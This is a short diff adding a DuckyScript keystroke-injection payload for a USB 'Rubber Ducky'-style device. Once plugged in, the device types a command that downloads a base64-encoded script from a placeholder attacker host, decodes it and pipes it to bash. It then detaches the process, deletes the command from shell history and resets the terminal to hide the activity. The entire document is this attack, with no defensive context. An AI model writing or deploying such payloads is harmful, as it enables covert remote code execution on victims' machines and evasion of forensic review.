@@ -1,0 +1,5 @@
+# https://ducktoolkit.com/encode
+DELAY 400
+STRING curl -s http://<IP>:<PORT>/.ejec |base64 -d|bash & disown -h $!;history -d $(set -- $(history 1);echo $1);tput reset
+DELAY 200
+ENTER
